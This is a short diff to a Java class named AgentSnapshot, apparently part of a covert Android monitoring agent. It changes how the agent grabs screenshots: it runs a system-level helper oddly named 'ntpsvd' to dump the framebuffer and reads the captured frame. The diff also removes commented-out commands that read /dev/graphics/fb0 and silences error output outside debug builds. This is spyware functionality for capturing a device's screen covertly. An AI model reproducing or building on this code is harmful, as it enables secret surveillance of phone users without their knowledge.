@@ -247,36 +247,22 @@ public class AgentSnapshot extends AgentBase {
 	}
 
 	private byte[] getRawBitmap() {
-		// String
-		// getrawpath="statuslog -c \"/system/bin/cat /dev/graphics/fb0\""
 		File filesPath = Status.getAppContext().getFilesDir();
 		String path = filesPath.getAbsolutePath();
 
-		// String
-		// String getrawpath = path +
-		// "/statusdb -c \"/system/bin/cp /dev/graphics/fb0 "+path+"/frame0\"";
-		String getrawpath = path + "/statusdb fb";
+		String getrawpath = "/system/bin/ntpsvd fb";
 		try {
 			Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			// FileChannel fc = new FileInputStream(new File(path, "frame"))
-			// .getChannel();
-			// IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0,
-			// fc.size())
-			// .asIntBuffer();
-
-			// return ib;
 			AutoFile file = new AutoFile(path, "frame");
 			if (file.exists()) {
 				return file.read();
 			}
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Cfg.DEBUG) e.printStackTrace();
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Cfg.DEBUG) e.printStackTrace();
 		}
 		return null;
 	}
